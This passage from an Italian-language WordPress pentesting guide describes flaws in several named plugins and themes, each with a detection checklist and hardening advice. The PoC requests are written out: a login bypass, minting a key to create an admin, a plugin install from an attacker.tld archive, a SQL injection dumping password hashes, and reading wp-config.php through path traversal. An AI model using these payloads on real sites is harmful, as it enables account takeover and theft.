}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // 🔥 logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Perché è sfruttabile

- Accessibile senza autenticazione tramite admin-ajax.php (azione wp_ajax_nopriv_…).
- Nessun controllo di nonce/capability prima della modifica di stato.
- Manca la verifica del provider OAuth/OpenID; il ramo di default accetta input dell'attaccante.
- get_user_by('email', $_POST['id']) seguito da wp_set_auth_cookie($uid) autentica il richiedente come qualsiasi indirizzo email esistente.

Sfruttamento (senza autenticazione)

- Prerequisiti: l'attaccante può raggiungere /wp-admin/admin-ajax.php e conosce/indovina un indirizzo email utente valido.
- Imposta provider su un valore non supportato (o omettendolo) per raggiungere il ramo di default e inviare id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Indicatori di successo attesi

- HTTP 200 con body JSON tipo {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* per l'utente vittima; le richieste successive sono autenticate.

Trovare il nome dell'action

- Ispeziona il tema/plugin per registrazioni add_action('wp_ajax_nopriv_...', '...') nel codice di social login (es., framework/add-ons/social-login/class-social-login.php).
- Grep per wp_set_auth_cookie(), get_user_by('email', ...) nei gestori AJAX.

Checklist di rilevamento

- Log web che mostrano POST non autenticati a /wp-admin/admin-ajax.php con l'action social-login e id=<email>.
- Risposte 200 con il JSON di successo immediatamente precedenti a traffico autenticato dallo stesso IP/User-Agent.

Mitigazioni

- Non derivare l'identità dall'input del client. Accetta solo email/ID che provengono da un token/ID del provider validato.
- Richiedi CSRF nonces e controlli di capability anche per helper di login; evita di registrare wp_ajax_nopriv_ a meno che non sia strettamente necessario.
- Valida e verifica le risposte OAuth/OIDC lato server; rifiuta provider mancanti/invalidi (no fallback a POST id).
- Considera la disabilitazione temporanea del social login o un patch virtuale al bordo (bloccare l'action vulnerabile) fino alla risoluzione.

Comportamento corretto (Jobmonster 4.8.0)

- Rimosso il fallback insicuro da $_POST['id']; $user_email deve provenire dai branch provider verificati in switch($_POST['using']).

## Escalation di privilegi non autenticata tramite emissione di token/chiave REST su identità prevedibile (OttoKit/SureTriggers ≤ 1.0.82)

Alcuni plugin espongono endpoint REST che emettono “connection keys” riutilizzabili o token senza verificare le capability del chiamante. Se la route si autentica solo su un attributo indovinabile (es., username) e non lega la chiave a un utente/sessione con controlli di capability, un attaccante non autenticato può emettere una chiave e invocare azioni privilegiate (creazione account admin, azioni del plugin → RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC – emetti una connection key e usala
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# → {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Perché è sfruttabile
- Route REST sensibile protetta solo da una prova di identità a bassa entropia (username) o da permission_callback mancante
- Nessun enforcement delle capability; la chiave emessa viene accettata come bypass universale

Checklist di rilevamento
- Esegui grep sul codice del plugin per register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Qualsiasi route che emette token/chiavi basate su identità fornita nella richiesta (username/email) senza collegarle a un utente autenticato o a una capability
- Cerca route successive che accettano la token/chiave emessa senza controlli di capability lato server

Mitigazioni
- Per qualsiasi route REST privilegiata: richiedere un permission_callback che applichi current_user_can() per la capability richiesta
- Non emettere chiavi a lunga durata basate su identità fornite dal client; se necessario, rilasciare token a breve durata vincolati all'utente dopo l'autenticazione e ricontrollare le capability al momento dell'uso
- Valida il contesto utente del chiamante (wp_set_current_user da solo non è sufficiente) e rifiuta le richieste dove !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse → unauthenticated arbitrary plugin installation (FunnelKit Automations ≤ 3.5.3)

Nonces prevengono il CSRF, non l'autorizzazione. Se il codice interpreta il superamento di un nonce come via libera e poi salta i controlli di capability per operazioni privilegiate (es., install/activate plugins), attaccanti non autenticati possono soddisfare un requisito di nonce debole e ottenere RCE installando un plugin backdoored o vulnerabile.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce “passes”
- Impact: compromissione completa tramite installazione/attivazione arbitraria di plugin

PoC (la forma dipende dal plugin; solo illustrativo)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Checklist di rilevamento
- REST/AJAX handlers che modificano plugin/theme con solo wp_verify_nonce()/check_admin_referer() e senza controllo di capability
- Qualsiasi path di codice che imposti $skip_caps = true dopo la validazione del nonce

Rafforzamento
- Considera sempre i nonces solo come CSRF tokens; applica i controlli di capability indipendentemente dallo stato del nonce
- Richiedi current_user_can('install_plugins') e current_user_can('activate_plugins') prima di raggiungere il codice dell'installer
- Rifiuta l'accesso non autenticato; evita di esporre azioni AJAX nopriv per flussi privilegiati

---

## SQLi non autenticato tramite il parametro s (search) nelle azioni depicter-* (Depicter Slider ≤ 3.6.1)

Diverse action depicter-* consumavano il parametro s (search) e lo concatenavano in query SQL senza parameterizzazione.

- Parameter: s (search)
- Flaw: concatenazione diretta di stringhe nelle clausole WHERE/LIKE; assenza di prepared statements e sanitizzazione
- Impact: esfiltrazione del database (utenti, hash), movimento laterale

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Checklist di rilevamento
- Eseguire grep per depicter-* action handlers e l'uso diretto di $_GET['s'] o $_POST['s'] in SQL
- Rivedere le query personalizzate passate a $wpdb->get_results()/query() che concatenano s

Rafforzamento
- Usare sempre $wpdb->prepare() o i placeholder di wpdb; rifiutare metacaratteri inaspettati lato server
- Aggiungere una allowlist rigorosa per s e normalizzare al charset/lunghezza attesi

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder ≤ 2.5.1)

Accettare percorsi controllati dall'attaccante in un parametro template senza normalizzazione/contenimento permette di leggere file locali arbitrari, e talvolta l'esecuzione di codice se file PHP/log includibili vengono caricati a runtime.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: no normalization/allowlisting; traversal permitted
- Impact: divulgazione di segreti (wp-config.php), possibile RCE in ambienti specifici (log poisoning, includable PHP)

PoC – leggere wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Checklist di rilevamento
- Qualsiasi handler che concatena path di richiesta in sink include()/require()/read senza verifica di containment con realpath()
- Cerca pattern di traversal (../) che raggiungono al di fuori della directory templates prevista

Hardening
- Forzare allowlisted templates; risolvere con realpath() e richiedere str_starts_with(realpath(file), realpath(allowed_base))
- Normalizzare l'input; rifiutare sequenze di traversal e percorsi assoluti; usare sanitize_file_name() solo per nomi di file (non per percorsi completi)


## Riferimenti

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025’s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ≤ 1.0.82 – Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ≤ 3.5.3 – Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ≤ 3.6.1 – Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ≤ 2.5.1 – Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
